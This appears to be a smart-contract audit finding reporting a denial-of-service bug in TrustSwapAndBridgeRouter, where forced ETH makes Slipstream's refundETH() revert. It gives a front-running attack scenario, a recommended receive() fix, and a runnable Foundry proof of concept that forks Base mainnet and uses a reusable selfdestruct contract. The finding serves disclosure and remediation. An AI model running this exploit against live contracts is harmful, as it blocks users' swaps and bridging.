  "body": "## Description:\n\n`TrustSwapAndBridgeRouter` delegates swaps to the Slipstream (Aerodrome CL) SwapRouter via `exactInput()`. \n```solidity\n    function swapAndBridgeWithETH(\n        bytes calldata path,\n        uint256 minTrustOut,\n        address recipient\n    )\n        external\n        payable\n        nonReentrant\n        returns (uint256 amountOut, bytes32 transferId)\n    {\n \n// ... swap logic\n        amountOut = ISlipstreamSwapRouter(slipstreamSwapRouter)\n            .exactInput( // exactInput()\n                ISlipstreamSwapRouter.ExactInputParams({\n                    path: path,\n                    recipient: address(this),\n                    deadline: block.timestamp,\n                    amountIn: swapEth,\n                    amountOutMinimum: minTrustOut\n                })\n            );\n// ...\n    }\n```\n\nAfter the swap, the Slipstream router calls `refundETH()` (from PeripheryPayments) to return any leftover ETH to the caller:\n\n```solidity\n// SwapRouter.sol\nfunction exactInput(ExactInputParams memory params)\n        external\n        payable\n        override\n        checkDeadline(params.deadline)\n        returns (uint256 amountOut)\n    {\n// ... swap logic\n        refundETH();\n    }\n\n// PeripheryPayments.sol (Aerodrome Slipstream)\nfunction refundETH() public payable override nonReentrant {\n    if (address(this).balance > 0) TransferHelper.safeTransferETH(msg.sender, address(this).balance);\n}\n```\n\nSo the Slipstream router sends its full ETH balance to `msg.sender`, which is `TrustSwapAndBridgeRouter`. `TrustSwapAndBridgeRouter` has no `receive()` or `fallback()` and does not handle incoming ETH. A plain ETH transfer to it reverts. Therefore, if the Slipstream SwapRouter has any ETH balance at the time of the call, the entire `swapAndBridgeWithETH` or `swapAndBridgeWithERC20` transaction reverts.\n\nAn attacker can force ETH onto the Slipstream SwapRouter using a contract that calls `selfdestruct(router)`. `selfdestruct()` after EIP-6780 (Cancun) only forwards ETH to the beneficiary without destroying the contract bytecode and does not allow the target to reject ETH; the Slipstream router cannot refuse this. With as little as 1 wei on the Slipstream router, every subsequent `swapAndBridgeWithETH` and `swapAndBridgeWithERC20` call fails. The same selfdestruct contract can be reused (bytecode is no longer removed), so the attack is cheap and repeatable.\n\n## Scenario:\n\n1. Victim prepares a transaction calling `swapAndBridgeWithETH()` or `swapAndBridgeWithERC20()` and broadcasts it to the mempool.\n\n2. Attacker sees the transaction and frontruns it. Attacker deploys a small contract that accepts ETH and has a function that calls `selfdestruct(slipstreamSwapRouter)`.\n\n3. Attacker sends 1 wei to this contract and calls the function. The contract selfdestructs and forces 1 wei to the Slipstream SwapRouter. The router cannot reject this transfer.\n\n4. Victim's transaction is included. It calls `exactInput()` on the Slipstream router. The swap executes, then the Slipstream router calls `refundETH()` and attempts to send its balance (at least 1 wei) to `TrustSwapAndBridgeRouter`.\n\n5. The transfer to `TrustSwapAndBridgeRouter` reverts because the contract has no `receive()` or `fallback()`. The whole transaction reverts and the victim's swap and bridge do not execute.\n\n6. All users are affected: every `swapAndBridgeWithETH` and `swapAndBridgeWithERC20` call fails. The attacker can repeatedly send 1 wei to the Slipstream router using the same contract (EIP-6780 leaves bytecode in place).\n\n## Impact:\n\nFull DoS of swap-and-bridge. Both `swapAndBridgeWithETH` and `swapAndBridgeWithERC20` are unusable whenever the Slipstream SwapRouter holds any ETH. Users cannot swap and bridge from Base to the destination chain via the protocol.\n\nLow cost of attack. Can be repeated many times. One wei per attack (+gas); the selfdestruct contract can be reused. No need to hold or lock significant funds.\n\n## Recommended Mitigation:\n\nAdd a `receive()` to `TrustSwapAndBridgeRouter` so it can accept ETH sent by the Slipstream router in `refundETH()`:\n\n```solidity\nreceive() external payable {}\n```\n\nAdditionally add a function to pull any accidental or refunded ETH to a designated recipient",
  "proof_of_concept": "1. Put below code in `tests/PoCPeriphery.t.sol` and save\n2. Run `BASE_RPC_URL=<your_base_rpc> forge test --match-contract PoCPeriphery --match-test submissionValidity -vv` in the terminal\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.29;\n\nimport { console2 } from \"forge-std/src/console2.sol\";\nimport { BaseTest } from \"./BaseTest.t.sol\";\nimport { TrustSwapAndBridgeRouter } from \"contracts/TrustSwapAndBridgeRouter.sol\";\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { IMetaERC20Hub } from \"contracts/interfaces/external/metalayer/IMetaERC20Hub.sol\";\n\n/**\n * PoC: Attacker sends 1 wei to Slipstream SwapRouter via selfdestruct (cannot be rejected).\n * After exactInput() the router calls refundETH() -> safeTransferETH(TrustSwapAndBridgeRouter).\n * TrustSwapAndBridgeRouter has no receive() -> revert. swapAndBridgeWithETH/swapAndBridgeWithERC20 blocked.\n *\n * Run: BASE_RPC_URL=<your_base_rpc> forge test --match-contract PoCPeriphery --match-test submissionValidity\n */\ncontract PoCPeriphery is BaseTest {\n    address constant TRUST = 0x6cd905dF2Ed214b22e0d48FF17CD4200C1C6d8A3;\n    address constant WETH = 0x4200000000000000000000000000000000000006;\n    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;\n    address constant META_ERC20_HUB = 0xE12aaF1529Ae21899029a9b51cca2F2Bc2cfC421;\n    int24 constant TS_WETH_USDC = 50;\n    int24 constant TS_USDC_TRUST = 1;\n    uint256 constant FORK_BLOCK = 41_970_000;\n    uint256 constant MOCK_BRIDGE_FEE = 0.001 ether;\n    bytes32 constant MOCK_TRANSFER_ID = keccak256(\"mock-transfer-id\");\n\n    function test_submissionValidity() external {\n        vm.stopPrank();\n        string memory baseRpc = vm.envString(\"BASE_RPC_URL\");\n        vm.createSelectFork(baseRpc, FORK_BLOCK);\n\n        TrustSwapAndBridgeRouter router = new TrustSwapAndBridgeRouter();\n        vm.mockCall(\n            META_ERC20_HUB,\n            abi.encodeWithSelector(IMetaERC20Hub.quoteTransferRemote.selector),\n            abi.encode(MOCK_BRIDGE_FEE)\n        );\n        vm.mockCall(\n            META_ERC20_HUB,\n            abi.encodeWithSelector(IMetaERC20Hub.transferRemote.selector),\n            abi.encode(MOCK_TRANSFER_ID)\n        );\n\n        address victim = makeAddr(\"victim\");\n        address attacker = makeAddr(\"attacker\");\n        vm.deal(victim, 10 ether);\n        vm.deal(attacker, 1 ether);\n\n        bytes memory path = abi.encodePacked(WETH, TS_WETH_USDC, USDC, TS_USDC_TRUST, TRUST);\n        uint256 swapEth = 0.01 ether;\n        uint256 totalValue = swapEth + MOCK_BRIDGE_FEE;\n\n        console2.log(\"Stage 1: Victim tx (swapAndBridgeWithETH) would be in mempool\");\n        console2.log(\"Stage 2: Attacker frontruns - sends 1 wei to Slipstream SwapRouter via selfdestruct (cannot be rejected)\");\n        SelfDestructSender bomb = new SelfDestructSender();\n        vm.prank(attacker);\n        (bool sent,) = address(bomb).call{ value: 1 }(\"\");\n        assertTrue(sent);\n        bomb.sendTo(payable(router.slipstreamSwapRouter()));\n        assertEq(router.slipstreamSwapRouter().balance, 1);\n\n        console2.log(\"Stage 3: Victim tx runs -> exactInput() -> refundETH() -> safeTransferETH(Router) -> Router has no receive() -> REVERT\");\n        vm.prank(victim);\n        vm.expectRevert();\n        router.swapAndBridgeWithETH{ value: totalValue }(path, 0, victim);\n\n        console2.log(\"Stage 4: Attacker again sends 1 wei via same selfdestruct contract (EIP-6780: bytecode not removed)\");\n        vm.prank(attacker);\n        (bool sent2,) = address(bomb).call{ value: 1 }(\"\");\n        assertTrue(sent2);\n        bomb.sendTo(payable(router.slipstreamSwapRouter()));\n\n        console2.log(\"Stage 5: Victim tries swapAndBridgeWithERC20 -> same revert (Router has no receive())\");\n        deal(USDC, victim, 10e6);\n        vm.startPrank(victim);\n        IERC20(USDC).approve(address(router), 10e6);\n        vm.expectRevert();\n        router.swapAndBridgeWithERC20{ value: MOCK_BRIDGE_FEE }(\n            USDC, 10e6, abi.encodePacked(USDC, TS_USDC_TRUST, TRUST), 0, victim\n        );\n        vm.stopPrank();\n    }\n}\n\n/// @notice Sends its ETH balance to target via selfdestruct. Target cannot reject.\n/// @dev EIP-6780 (Cancun): selfdestruct no longer removes bytecode; it only forwards ETH to the beneficiary.\ncontract SelfDestructSender {\n    receive() external payable { }\n\n    function sendTo(address payable target) external {\n        selfdestruct(target);\n    }\n}\n\n```",
